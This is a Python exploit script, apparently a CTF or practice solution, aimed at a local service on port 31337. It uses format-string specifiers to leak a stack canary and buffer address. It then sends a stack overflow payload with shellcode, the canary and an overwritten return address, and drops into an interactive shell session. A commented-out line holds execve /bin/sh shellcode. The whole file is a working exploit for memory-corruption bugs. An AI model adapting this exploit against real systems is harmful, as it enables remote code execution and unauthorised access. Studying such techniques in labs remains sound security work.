import socket
import struct
from telnetlib import Telnet
import time

#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode = "\xCC"*8
remote_addr = "127.0.0.1"
remote_port = 31337

EXPLOIT_BUFFER_ADDR_INDEX = 6

def sendline(sock, msg):
	sock.send(msg+b"\n")
def recvuntil_c(sock, character):
	out = b''
	current = b''
	while current != character:
		current = sock.recv(1)
		if current != character:
			out += current
	return out
def recvline(sock):
	return recvuntil_c(sock, b"\n")
def print_recieved(recieved):
	print("[*] Recieved : "+str(recieved))
def print_addr_array(arr):
	i = 0
	for elem in arr:
		print(str(i) + " : " +hex(elem))
		i += 1
def padding(p, buffer_size):
	off = buffer_size - len(p)
	ret = p
	ret += "\x90"*off
	return ret
def str_arr2int_arr(arr):
	out = []
	for elem in arr:
			try:
				out.append(int(elem, 16))
			except Exception:
				out.append(-1)
				pass
	return out

def user_interactive(sock):
	try:
		t = Telnet()
		t.sock = sock
		t.interact()
		sock.close()
	except Exception as e:
		sock.close()
def exploit(sock, shellcode):
	try:
		resp = sock.recv(1024)
		print_recieved(resp)

		payload = bytearray()
		payload += b"%19$lx"
		payload += b" "
		payload += b"%7$lx"
		#payload = padding(payload, 64)
		sendline(sock, payload)

		resp = recvline(sock)
		print_recieved(resp)

		leaks = resp.split(" ")
		del leaks[0]
		stack_addresses = str_arr2int_arr(leaks)

		print_addr_array(stack_addresses)

		buffer_addr = stack_addresses[1]
		print("[*] Buffer address : "+hex(buffer_addr))

		stack_canary_value = stack_addresses[0]
		print("[*] Stack canary : "+hex(stack_canary_value))

		resp = sock.recv(1024)
		print_recieved(resp)

		payload = padding(shellcode, 64)
		payload += struct.pack("Q", stack_canary_value)
		payload += "A"*8 # EBP
		payload += struct.pack("Q", buffer_addr)
		time.sleep(1)
		sendline(sock, payload)

		sendline(sock, "id")
		resp = sock.recv(1024)
		print_recieved(resp)

		user_interactive(sock)

		sock.close()
	except Exception as e:
		print("Error : "+str(e))
		sock.close()

sock = socket.socket()
sock.connect((remote_addr, remote_port))

raw_input("Start exploit ?")

exploit(sock, shellcode)